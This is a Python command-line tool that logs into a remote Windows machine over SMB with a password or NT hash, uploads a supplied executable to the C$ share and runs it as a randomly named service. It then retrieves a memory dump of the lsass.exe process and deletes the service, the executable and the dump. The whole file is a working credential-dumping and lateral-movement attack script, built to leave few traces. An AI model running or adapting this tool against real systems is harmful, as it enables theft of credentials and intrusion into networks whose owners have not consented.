#!/usr/bin/env python3

from logging import getLogger
from typing import Union, Optional, Iterable, SupportsInt, ByteString, AsyncContextManager
from asyncio import sleep as asyncio_sleep, run as asyncio_run
from argparse import Namespace as ArgparseNamespace, FileType
from pathlib import PureWindowsPath
from uuid import uuid4
from contextlib import asynccontextmanager

from smb.contrib.argument_parsers import SmbSingleAuthenticationArgumentParser
from smb.transport import TCPIPTransport
from smb.v2.connection import Connection as SMBv2Connection
from smb.v2.session import Session as SMBv2Session
from smb.v2.messages.create import CreateOptions, FilePipePrinterAccessMask, CreateDisposition, ShareAccess
from rpc.connection import Connection as RPCConnection
from rpc.structures.context_list import ContextList, ContextElement
from ms_scmr import MS_SCMR_ABSTRACT_SYNTAX, MS_SCMR_PIPE_NAME
from ms_scmr.operations.r_open_sc_manager_w import r_open_sc_manager_w, ROpenSCManagerWRequest, SCManagerAccessFlagMask
from ms_scmr.operations.r_create_service_w import r_create_service_w, RCreateServiceWRequest, ServiceType, StartType, \
    ServiceAccessFlagMask, ErrorControl
from ms_scmr.operations.r_start_service_w import r_start_service_w, RStartServiceWRequest
from ms_scmr.operations.r_query_service_status import r_query_service_status, RQueryServiceStatusRequest
from ms_scmr.structures.service_status import CurrrentState
from ms_scmr.operations.r_delete_service import r_delete_service, RDeleteServiceRequest


LOG = getLogger(__name__)


class ServiceNotStoppedError(Exception):
    def __init__(
        self,
        service_name: Union[str, object],
        service_display_name: Union[str, object],
        server_name: Union[str, object]
    ):
        super().__init__(
            f'The service named {service_name} (display name {service_display_name} did not stop '
            f'on the remote system {server_name}.'
        )
        self.service_name = str(service_name)
        self.service_display_name = str(service_display_name)
        self.server_name = str(server_name)


async def read_dump(
    smb_session: SMBv2Session,
    tree_id: Union[int, SupportsInt],
    relative_dump_path: Union[str, object]
) -> bytes:
    """
    Read the memory dump from the remote system.

    :param smb_session: An SMB session with which to read the memory dump file on the remote system.
    :param tree_id: The tree id of the connection to the share in which the memory dump file is located.
    :param relative_dump_path: A share-relative path of the memory dump file.
    :return: The contents of the memory dump file.
    """

    create_kwargs = dict(
        path=str(relative_dump_path),
        tree_id=int(tree_id),
        create_options=CreateOptions(non_directory_file=True, delete_on_close=True),
        desired_access=FilePipePrinterAccessMask(file_read_data=True, delete=True)
    )
    async with smb_session.create(**create_kwargs) as create_response:
        return await smb_session.read(
            file_id=create_response.file_id,
            file_size=create_response.endof_file,
            tree_id=tree_id
        )


@asynccontextmanager
async def _provide_service(
    rpc_connection: RPCConnection,
    scm_handle: ByteString,
    absolute_service_executable_path: Union[str, object] = PureWindowsPath(fr'C:\Windows\Temp\{uuid4()}'),
    service_name: Union[str, object] = str(uuid4()),
    service_display_name: Union[str, object] = str(uuid4()),
) -> AsyncContextManager[bytes]:
    """
    Create a service and provide its handle, later delete the service.

    :param rpc_connection: An RPC connection with which to create the service.
    :param scm_handle: A handle to an opened SCM with which to create the service.
    :param absolute_service_executable_path: The path of the service's executable.
    :param service_name: The name to be given the service.
    :param service_display_name: The display name to be given the service.
    :return: None
    """

    r_create_service_w_options = dict(
        rpc_connection=rpc_connection,
        request=RCreateServiceWRequest(
            scm_handle=bytes(scm_handle),
            service_name=str(service_name),
            display_name=str(service_display_name),
            desired_access=ServiceAccessFlagMask(start=True, query_status=True, delete=True),
            service_type=ServiceType.SERVICE_WIN32_OWN_PROCESS,
            start_type=StartType.SERVICE_DEMAND_START,
            error_control=ErrorControl.SERVICE_ERROR_IGNORE,
            binary_path_name=str(absolute_service_executable_path),
        )
    )
    async with r_create_service_w(**r_create_service_w_options) as r_create_service_w_response:
        yield r_create_service_w_response.service_handle

        await r_delete_service(
            rpc_connection=rpc_connection,
            request=RDeleteServiceRequest(service_handle=r_create_service_w_response.service_handle)
        )


@asynccontextmanager
async def _provide_service_executable(
    smb_session: SMBv2Session,
    tree_id: Union[int, SupportsInt],
    relative_service_executable_path: Union[str, object],
    service_executable_data: ByteString
) -> AsyncContextManager[None]:
    """
    Create the service executable file in a remote share, later delete it.

    :param smb_session: An SMB session with which to write the file.
    :param tree_id: The tree ID of the connection to share in which to write the file.
    :param relative_service_executable_path: A share-relative path where to write the file.
    :param service_executable_data: The contents of the service executable to be written to a file.
    :return: None
    """

    create_kwargs = dict(
        path=str(relative_service_executable_path),
        tree_id=int(tree_id),
        create_options=CreateOptions(non_directory_file=True),
        create_disposition=CreateDisposition.FILE_CREATE,
        desired_access=FilePipePrinterAccessMask(file_write_data=True),
        share_access=ShareAccess(write=True)
    )
    async with smb_session.create(**create_kwargs) as create_response:
        await smb_session.write(
            write_data=bytes(service_executable_data),
            file_id=create_response.file_id,
            tree_id=int(tree_id),
            remaining_bytes=len(service_executable_data)
        )

    yield

    create_kwargs = dict(
        path=str(relative_service_executable_path),
        tree_id=int(tree_id),
        create_options=CreateOptions(non_directory_file=True, delete_on_close=True),
        desired_access=FilePipePrinterAccessMask(delete=True)
    )
    async with smb_session.create(**create_kwargs):
        pass


async def dump_lsass(
    smb_session: SMBv2Session,
    tree_id: Union[int, SupportsInt],
    service_executable_data: ByteString,
    absolute_service_executable_path: Union[str, object] = PureWindowsPath(fr'C:\Windows\Temp\{uuid4()}'),
    relative_service_executable_path: Optional[Union[str, object]] = None,
    relative_dump_path: Union[str, object] = PureWindowsPath(fr'Windows\Temp\{uuid4()}'),
    dump_tree_id: Optional[int] = None,
    service_name: Union[str, object] = str(uuid4()),
    service_display_name: Union[str, object] = str(uuid4()),
    service_argv: Iterable[str] = tuple(),
    wait_time_in_seconds: Union[int, SupportsInt] = 2,
    max_num_retries: Union[int, SupportsInt] = 5
) -> bytes:
    """
    Retrieve the lsass.exe process memory from a remote system.

    The memory is obtained by locally dumping it from the process. The dumping is performed by the an executable, whose
    data is provided. The executable data is stored as a file on the remote system of the provided SMB connection via
    the SMB WRITE operation. The executable is run by creating and starting a service pointing to the executable. The
    executable should place the dump at the specified path. The dump is then read via the SMB READ command once the
    service has stopped.

    A cleanup step is performed that removes the service, service executable, and memory dump file on the remote system.

    :param smb_session: An SMB session with which to perform the dumping procedure.
    :param tree_id: The tree ID of the connection to the share in which to place the service executable.
    :param service_executable_data: The contents of the service executable.
    :param absolute_service_executable_path: The absolute path of the future location of the service executable on the
        remote system. Provided in the creation of the service.
    :param relative_service_executable_path: The share-relative path of the future location of the service executable
        on the remote system. Defaults to the absolute path, with the root removed.
    :param relative_dump_path: The share-relative path of the future location of the memory dump on the remote system.
    :param dump_tree_id: The tree ID of the share connection from which to retrieve the memory dump. Default to the same
        tree id as that for the service executable.
    :param service_name: The name to be given service that will
    :param service_display_name:
    :param service_argv: A sequence of arguments to be
    :param wait_time_in_seconds: The number of seconds to wait in each retry attempt.
    :param max_num_retries: The maximum number of retry attempts to perform waiting for the memory dump file to be
        available.
    :return: The memory dump data.
    """

    relative_service_executable_path = relative_service_executable_path or PureWindowsPath(
        *PureWindowsPath(absolute_service_executable_path).parts[1:]
    )

    dump_tree_id = dump_tree_id or tree_id

    provide_service_executable_options = dict(
        smb_session=smb_session,
        tree_id=tree_id,
        relative_service_executable_path=relative_service_executable_path,
        service_executable_data=service_executable_data
    )
    async with _provide_service_executable(**provide_service_executable_options):
        async with smb_session.make_smbv2_transport(pipe=MS_SCMR_PIPE_NAME) as (r, w):
            async with RPCConnection(reader=r, writer=w) as rpc_connection:
                await rpc_connection.bind(
                    presentation_context_list=ContextList([
                        ContextElement(context_id=0, abstract_syntax=MS_SCMR_ABSTRACT_SYNTAX)
                    ])
                )

                r_open_sc_manager_w_options = dict(
                    rpc_connection=rpc_connection,
                    request=ROpenSCManagerWRequest(
                        desired_access=SCManagerAccessFlagMask(connect=True, create_service=True)
                    )
                )
                async with r_open_sc_manager_w(**r_open_sc_manager_w_options) as r_open_sc_manager_w_response:
                    provide_service_options = dict(
                        rpc_connection=rpc_connection,
                        scm_handle=r_open_sc_manager_w_response.scm_handle,
                        absolute_service_executable_path=absolute_service_executable_path,
                        service_name=service_name,
                        service_display_name=service_display_name
                    )
                    async with _provide_service(**provide_service_options) as service_handle:
                        await r_start_service_w(
                            rpc_connection=rpc_connection,
                            request=RStartServiceWRequest(
                                service_handle=service_handle,
                                argv=tuple(service_argv)
                            )
                        )

                        for _ in range(int(max_num_retries)):
                            service_current_state: CurrrentState = (
                                await r_query_service_status(
                                    rpc_connection=rpc_connection,
                                    request=RQueryServiceStatusRequest(service_handle=service_handle)
                                )
                            ).service_status.current_state

                            if service_current_state is not CurrrentState.SERVICE_STOPPED:
                                await asyncio_sleep(delay=int(wait_time_in_seconds))
                            else:
                                break
                        else:
                            # NOTE: One can choose to call `read_dump` afterwards, even though the service did not stop.
                            raise ServiceNotStoppedError(
                                service_name=service_name,
                                service_display_name=service_display_name,
                                server_name=smb_session.connection.server_name
                            )

    return await read_dump(
        smb_session=smb_session,
        tree_id=dump_tree_id,
        relative_dump_path=relative_dump_path
    )


class DumpRemoteLsassArgumentParser(SmbSingleAuthenticationArgumentParser):
    def __init__(self, *args, **kwargs):
        super().__init__()
        self.add_argument(
            'target_address',
            type=str,
            metavar='TARGET_ADDRESS',
            help='The address of the SMB server on whose Windows system the lsass.exe process memory is to be dumped.'
        )

        self.add_argument(
            'service_executable',
            type=FileType('rb'),
            metavar='SERVICE_EXECUTABLE',
            help='A path to a service executable that will perform the memory dumping on the remote system.'
        )

        self.add_argument(
            '--output-path',
            type=FileType('wb'),
            metavar='OUTPUT_PATH',
            default='output.dmp',
            help='A local path to a file where the resulting memory dump is to be written.'
        )

        self.add_argument(
            '--share-name',
            type=str,
            metavar='SHARE_NAME',
            default='C$',
            help='The name of a share on the remote system in which to place the service executable.'
        )

        self.add_argument(
            '--dest-executable-path',
            type=str,
            metavar='DEST_EXECUTABLE_PATH',
            default=rf'C:\Windows\Temp\{uuid4()}',
            help='The absolute path on the remote system where the service executable will be located.'
        )

        self.add_argument(
            '--dest-executable-path-relative',
            type=str,
            metavar='DEST_EXECUTABLE_PATH_REL',
            help='The share-relative path on the remote system where the service executable will be located.'
        )

        self.add_argument(
            '--dump-share-name',
            type=str,
            metavar='DUMP_SHARE_NAME',
            default='C$',
            help='The name of a share on the remote system from which to retrieve the memory dump.'
        )

        self.add_argument(
            '--dump-path-relative',
            type=str,
            metavar='DUMP_PATH_REL',
            help='The share-relative path on the remote system where the memory dump will be located.'
        )

        self.add_argument(
            '--service-argv',
            type=str,
            metavar='SERVICE_ARGV',
            help='Arguments to be passed to the created service upon startup.'
        )

        self.add_argument(
            '--service-name',
            type=str,
            metavar='SERVICE_NAME',
            default=str(uuid4()),
            help='The name to be given to the service.'
        )

        self.add_argument(
            '--service-display-name',
            type=str,
            metavar='SERVICE_DISPLAY_NAME',
            default=str(uuid4()),
            help='The display name to be given to the service.'
        )

        self.add_argument(
            '--retry-wait-time',
            type=int,
            metavar='WAIT_TIME',
            default=2,
            help='The number of seconds to wait in each retry attempt, waiting for the memory dump to be available.'
        )

        self.add_argument(
            '--max-num-retries',
            type=int,
            metavar='MAX_NUM_RETRIES',
            default=5,
            help='The maximum number of retry attempts to be performed, waiting for the memory dump to be available.'
        )


async def main():
    args: ArgparseNamespace = DumpRemoteLsassArgumentParser().parse_args()

    async with TCPIPTransport(address=args.target_address, port_number=445) as tcp_ip_transport:
        async with SMBv2Connection(tcp_ip_transport=tcp_ip_transport) as smb_connection:
            await smb_connection.negotiate()

            setup_sessions_options = dict(
                username=args.username,
                authentication_secret=args.password or bytes.fromhex(args.nt_hash)
            )
            async with smb_connection.setup_session(**setup_sessions_options) as smb_session:
                async with smb_session.tree_connect(share_name=args.share_name) as (tree_id, _):
                    args.output_path.write(
                        await dump_lsass(
                            smb_session=smb_session,
                            tree_id=tree_id,
                            service_executable_data=args.service_executable.read(),
                            absolute_service_executable_path=args.dest_executable_path,
                            relative_service_executable_path=args.dest_executable_path_relative,
                            relative_dump_path=args.dump_path_relative,
                            dump_tree_id=tree_id,
                            service_name=args.service_name,
                            service_display_name=args.service_display_name,
                            service_argv=(args.service_argv,) if args.service_argv is not None else tuple(),
                            wait_time_in_seconds=args.retry_wait_time,
                            max_num_retries=args.max_num_retries
                        )
                    )

if __name__ == '__main__':
    asyncio_run(main())
